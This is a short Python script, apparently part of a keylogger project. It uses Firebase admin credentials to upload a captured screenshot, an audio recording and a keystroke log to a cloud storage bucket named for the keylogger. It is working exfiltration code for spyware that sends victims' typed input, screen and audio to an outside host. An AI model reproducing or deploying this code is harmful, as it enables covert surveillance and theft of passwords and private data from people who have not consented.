#!/usr/bin/env python3

import firebase_admin
from firebase_admin import credentials, storage

cred = credentials.Certificate("keylogger-firebase-adminsdk.json")
firebase_admin.initialize_app(cred, {
    'storageBucket': 'keylogger-6b3a0.appspot.com'
})

image_path = 'data\\screenshot.jpeg'
image_name = 'image_uploads/my_image.jpg' 

audio_path = 'data\\aduio.wav'
audio_name = 'audio_uploads/my_audio.wav'

log_path = 'data\\key_log.txt'
log_name = 'log_uploads/my_log.txt'

bucket = storage.bucket()
blob1 = bucket.blob(image_name)
blob1.upload_from_filename(image_path)
blob2 = bucket.blob(audio_name)
blob2.upload_from_filename(audio_path)
blob1 = bucket.blob(log_name)
blob1.upload_from_filename(log_path)

print('Image uploaded successfully!')
